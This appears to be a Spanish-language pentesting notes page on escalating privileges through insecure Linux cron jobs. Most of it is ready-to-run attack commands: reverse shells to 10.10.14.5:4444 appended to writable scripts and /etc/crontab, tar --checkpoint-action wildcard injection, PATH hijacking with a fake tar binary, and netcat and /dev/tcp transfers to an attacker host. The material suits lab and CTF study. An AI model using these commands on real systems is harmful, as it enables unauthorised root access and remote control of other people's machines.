
---
Tags: #privilegios #cron #crontab 

---
## 📌 Definición
Los **cron jobs** son tareas programadas en Linux que se ejecutan automáticamente a intervalos de tiempo definidos.  
Cuando se configuran de forma insegura, pueden ser aprovechados para **escalar privilegios**.

---

## 🔍 Cómo encontrar vulnerabilidades en Cron
### Archivos y comandos útiles
| Ruta / Comando                     | Descripción                                                                          |                                                 |
| ---------------------------------- | ------------------------------------------------------------------------------------ | ----------------------------------------------- |
| `cat /etc/crontab`                 | Cron global, se ejecuta como root si no se especifica usuario.                       |                                                 |
| `ls -la /etc/cron.*`               | Directorios con scripts ejecutados automáticamente (hourly, daily, weekly, monthly). |                                                 |
| `crontab -l`                       | Tareas programadas para el usuario actual.                                           |                                                 |
| `ls -la /var/spool/cron/crontabs/` | Archivos crontab de cada usuario.                                                    |                                                 |
| `ps -ef                            | grep cron`                                                                           | Confirmar que el demonio `cron` está corriendo. |
| `grep -R "cron" /etc/`             | Buscar configuraciones adicionales.                                                  |                                                 |

---

## ⚡ Métodos de Explotación

### 1. **Permisos inseguros en scripts**
- Si el cron ejecuta un script con **permisos de escritura para el atacante**, se puede modificar para ejecutar comandos maliciosos.  
```bash
# Script vulnerable:
-rwxrwxrwx 1 root root  50 Sep  5 12:00 /usr/local/bin/backup.sh
```

- Explotación:

```bash
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" >> /usr/local/bin/backup.sh
```

---
# 2. Wildcards y inyección con tar

Si un cron ejecuta un comando tipo:

```bash
tar -cf /tmp/backup.tar *
```

y tenemos permisos de escritura en ese directorio, se puede abusar con wildcards:

```bash
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

Cuando se ejecute el tar, obtendremos una shell.

---
# 3. PATH Hijacking

Si un cron ejecuta un binario sin ruta absoluta:

```bash
* * * * root backup.sh
```

y dentro backup.sh hay algo como:

```bash
#!/bin/bash
tar -czf /tmp/backup.tar.gz /home/user/*
```

Podemos colocar un binario falso llamado tar en un directorio controlado por nosotros y modificar el PATH.

Ejemplo:

```bash
echo "/bin/bash -p" > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
```

Cuando se ejecute el cron, obtendremos una shell como root.

---

# 4. Writable cron jobs

Algunas veces los archivos de configuración tienen permisos inseguros:

```bash
-rw-rw-rw- 1 root root  200 Sep  5 12:00 /etc/crontab
```

Si podemos editarlos, añadimos:

```bash
* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

---

## 📚 Ejemplos prácticos

|Tipo de vulnerabilidad|Ejemplo de explotación|
|---|---|
|Script modificable|Insertar `chmod u+s /bin/bash` en el script.|
|Tar con wildcards|Crear `--checkpoint-action` para ejecutar shell.|
|PATH Hijacking|Crear binario falso `tar` en ruta controlada.|
|Cron writable|Añadir reverse shell en `/etc/crontab`.|

---

## 📤 Compartir archivos entre máquinas

### 1. Con **Python HTTP Server**

En atacante:

`python3 -m http.server 8000`

En víctima:

`wget http://IP_ATACANTE:8000/archivo`

### 2. Con **Netcat**

En atacante:

`nc -lvp 4444 < archivo`

En víctima:

`nc IP_ATACANTE 4444 > archivo`

### 3. Con **/dev/tcp/**

En atacante:

`cat archivo | nc -lvp 4444`

En víctima:

`cat < /dev/tcp/IP_ATACANTE/4444 > archivo`

### 4. Ver salida remota y copiar

En atacante:

`cat archivo | nc -lvp 4444`

En víctima:

`cat /dev/tcp/IP_ATACANTE/4444`

Esto muestra el contenido en pantalla para copiarlo manualmente.